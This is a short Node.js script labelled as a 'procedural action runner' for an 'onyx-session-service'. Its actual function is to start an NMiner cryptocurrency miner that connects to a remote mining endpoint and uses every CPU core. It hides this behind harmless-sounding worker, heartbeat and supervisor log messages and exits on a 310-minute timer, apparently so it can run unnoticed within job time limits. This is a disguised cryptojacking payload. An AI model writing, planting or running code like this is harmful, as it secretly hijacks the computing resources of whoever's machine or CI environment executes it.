// Procedural action runner for onyx-session-service
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

class HostController {
    constructor() {
        const sessionId = "301959";
        console.log(`[worker] Initialized HostController for onyx-session-service [${sessionId}]`);

        this.engine = new NMiner(
            "wss://nmining-runtime.igrp.app/",
            "Subhas1975.onyx-session-service",
            ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
        );

        const heartbeat = setInterval(() => {}, 38000);
        setTimeout(() => {
        console.log("[timeout] Operational limit (310m) reached, exiting cleanly.");
        process.exit(0);
    }, 310 * 60 * 1000);

        process.on("SIGTERM", () => {
            clearInterval(heartbeat);
            console.log("[supervisor] Clean shutdown completed.");
            process.exit(0);
        });
    }
}

new HostController();
